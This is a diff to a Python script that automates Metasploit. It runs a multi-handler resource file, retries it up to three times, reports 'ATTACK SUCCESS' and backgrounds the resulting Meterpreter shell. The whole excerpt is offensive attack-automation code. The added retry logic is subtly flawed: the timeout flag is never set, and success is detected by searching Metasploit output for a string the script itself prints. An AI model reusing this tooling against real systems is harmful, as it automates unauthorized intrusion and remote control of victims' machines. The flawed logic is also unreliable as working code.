@@ -89,11 +89,30 @@ def run_resource(msf_script, resource_name):
             run_resource(msf_script, resource_name)  # Call the function recursively
             
 print("BEGINNING MULTI HANDLER")
-# Running resource2.rc
-run_resource(msf_script, 'resource2')
+# Running resource2.rc with retry logic
+timeout_occurred = 0
+max_retries = 3
+retry_delay = 5
 
-print ("RESOURCE 2 COMPLETED - ATTACK SUCCESS")
-print (msf_script.after)
+for attempt in range(max_retries):
+    run_resource(msf_script, 'resource2')
+
+    if "ATTACK SUCCESS" in msf_script.after:
+        print("RESOURCE 2 COMPLETED - ATTACK SUCCESS")
+        print(msf_script.after)
+        break
+
+    if timeout_occurred == 1:
+        print(f"RESOURCE 2 FAILED - TIMEOUT OCCURRED. RETRYING... (Attempt {attempt + 1}/{max_retries})")
+        time.sleep(retry_delay)
+    else:
+        print(f"RESOURCE 2 FAILED - ERROR OCCURRED. RETRYING... (Attempt {attempt + 1}/{max_retries})")
+        time.sleep(retry_delay)
+
+    timeout_occurred = 0  # Reset the timeout_occurred flag for the next attempt
+
+else:
+    print(f"Failed to run resource2.rc after {max_retries} attempts.")
 
 print ("METERPRETER SHELL TO BACKGROUND")
 msf_script.sendline('background')
